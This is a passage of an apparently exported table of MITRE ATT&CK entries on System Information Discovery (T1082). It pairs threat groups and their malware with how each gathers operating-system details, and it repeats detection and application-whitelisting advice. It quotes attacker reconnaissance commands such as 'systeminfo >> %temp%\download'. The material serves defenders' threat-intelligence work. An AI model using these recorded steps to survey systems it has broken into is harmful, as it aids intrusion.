'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: MobileOrder,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
193,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0096|Systeminfo]] can be used to gather information about the operating system.[[CiteRef::TechNet Systeminfo]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Systeminfo, systeminfo.exe",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
194,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0010|Turla]] surveys a system upon check-in to discover operating system configuration details using the <code>systeminfo</code> and <code>set</code> commands.[[CiteRef::Kaspersky Turla]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
195,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0081|Elise]] executes <code>systeminfo</code> after initial communication is made to the remote server.[[CiteRef::Lotus Blossom Jun 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Elise, BKDR_ESILE, Page",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
196,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0082|Emissary]] has the capability to execute ver, systeminfo, and gpresult commands.[[CiteRef::Emissary Trojan Feb 2016]]']",['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Emissary,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
197,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0089|BlackEnergy]] has used [[Software/S0096|Systeminfo]] to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.[[CiteRef::F-Secure BlackEnergy 2014]] [[CiteRef::Securelist BlackEnergy Nov 2014]]']",['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: BlackEnergy, Black Energy",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
198,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['During its initial execution, [[Software/S0031|BACKSPACE]] extracts operating system information from the infected host.[[CiteRef::FireEye APT30]]']",['APT30'],['APT30'],['G0013'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: BACKSPACE, Lecna",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
199,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0058|SslMM]] sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.[[CiteRef::Baumgartner Naikon 2015]]']",['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: SslMM,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
200,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0060|Sys10]] collects the computer name, OS versioning information, and OS install date and sends the information to the C2.[[CiteRef::Baumgartner Naikon 2015]]']",['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Sys10,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
201,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0059|WinMM]] collects the system name, OS version including service pack, and system install date and sends the information to the C2 server.[[CiteRef::Baumgartner Naikon 2015]]']",['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: WinMM,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
202,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0096|Systeminfo]] can be used to gather information about the operating system.[[CiteRef::TechNet Systeminfo]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Systeminfo, systeminfo.exe",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
203,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0043|BUBBLEWRAP]] collects system information, including the operating system version and hostname.[[CiteRef::FireEye admin@338]]']",['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: BUBBLEWRAP, Backdoor.APT.FakeWinHTTPHelper",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
204,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0096|Systeminfo]] can be used to gather information about the operating system.[[CiteRef::TechNet Systeminfo]]'],['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Systeminfo, systeminfo.exe",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
205,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0018|admin@338]] actors used the following commands after exploiting a machine with [[Software/S0042|LOWBALL]] malware to obtain information about the OS:\n** <code>ver >> %temp%\\download</code>\n** <code>systeminfo >> %temp%\\download</code>[[CiteRef::FireEye admin@338]]'],['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
206,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Group/G0038|Stealth Falcon]] malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.[[CiteRef::Citizen Lab Stealth Falcon May 2016]]']",['Stealth Falcon'],['Stealth Falcon'],['G0038'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
207,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0156|KOMPROGO]] is capable of retrieving information about the infected system.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: KOMPROGO,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
208,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0155|WINDSHIELD]] can gather the victim computer name.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: WINDSHIELD,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
209,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0157|SOUNDBITE]] is capable of gathering system information.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: SOUNDBITE,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
210,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0093|Backdoor.Oldrea]] collects information about the OS, computer name, and Internet adapter configuration.[[CiteRef::Symantec Dragonfly]]']",['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Backdoor.Oldrea, Havex",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
211,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['The initial beacon packet for [[Software/S0083|Misdat]] contains the operating system version of the victim.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Misdat,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
212,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['The initial beacon packet for [[Software/S0084|Mis-Type]] contains the operating system version and file system of the victim.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Mis-Type,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
213,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['The initial beacon packet for [[Software/S0085|S-Type]] contains the operating system version and file system of the victim.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like 